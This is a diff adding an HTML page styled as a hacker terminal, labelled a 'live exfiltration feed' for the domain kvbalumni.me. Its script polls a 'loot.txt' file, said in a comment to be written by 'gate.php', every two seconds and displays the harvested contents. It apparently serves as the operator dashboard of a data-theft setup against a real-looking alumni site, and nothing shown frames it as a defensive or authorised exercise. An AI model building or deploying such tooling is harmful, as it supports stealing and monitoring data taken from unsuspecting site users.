@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ALUMNI_SECURITY_LAB</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
+        #terminal { border: 2px solid #0f0; height: 450px; padding: 15px; overflow-y: scroll; background: #050505; text-align: left; box-shadow: 0 0 20px #0f0; }
+        .header { color: #fff; text-shadow: 0 0 10px #0f0; font-size: 24px; margin-bottom: 10px; }
+        .green-text { color: #0f0; }
+    </style>
+</head>
+<body>
+    <div class="header">[ LIVE EXFILTRATION FEED: kvbalumni.me ]</div>
+    <div id="terminal">INITIALIZING SENSORS...</div>
+
+    <script>
+        function updateFeed() {
+            // This reads the text file created by gate.php
+            fetch('loot.txt?' + new Date().getTime())
+                .then(r => r.text())
+                .then(data => {
+                    const terminal = document.getElementById('terminal');
+                    terminal.innerText = data || "STATION IDLE - WAITING FOR DATA...";
+                    terminal.scrollTop = terminal.scrollHeight; // Auto-scrolls to the bottom
+                });
+        }
+        setInterval(updateFeed, 2000);
+    </script>
+</body>
+</html>
